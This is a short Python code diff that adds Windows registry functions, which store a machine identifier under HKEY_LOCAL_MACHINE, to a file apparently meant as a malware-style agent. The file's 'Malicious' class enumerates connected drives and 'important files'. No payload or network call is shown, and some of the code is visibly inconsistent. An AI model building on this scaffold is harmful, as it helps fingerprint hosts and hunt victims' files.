@@ -18,13 +18,33 @@ class Computer:
 
     def __init__(self) -> None:
         self.agent_uuid = None
+        self.possible_hives = ["HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"]
 
     def get_uuid(self):
         # This function should first try to see if there is a uuid in registry and if not create one and pass it to the registry.
-        pass
+        hkey = "HKEY_LOCAL_MACHINE"
+        subkey = "SOFTWARE\\Testing"
+        try:
+            uuid_key = self.open_registry_key(Key=subkey)
+        except FileNotFoundError:
+            self.create_registry_key(Key=subkey)
+            uuid_key = self.open_registry_key(Key=subkey)
+        uuid_value = uuid.getnode()
+        winreg.SetValue(uuid_key, "uuid", winreg.REG_SZ, str(uuid_value))
+
 
     def get_registry_value(self, Hive, Key):
-        pass
+        for hive in self.possible_hives:
+            if hive == Hive:
+                registry_key_value = winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, Key)
+                print(registry_key_value)
+    
+    def create_registry_key(self, Key):
+        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, Key)
+    
+    def open_registry_key(self, Key):
+        key_obj = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, Key, reserved=0, access=winreg.KEY_ALL_ACCESS)
+        return key_obj
 
 class Malicious:
 
@@ -68,6 +88,5 @@ class Malicious:
                     self.list_of_all_connected_drives.append(letter)
                     
 
-obj = Malicious()
-obj.find_all_connected_drives()
-obj.find_all_important_files()
+obj = Computer()
+obj.get_uuid()
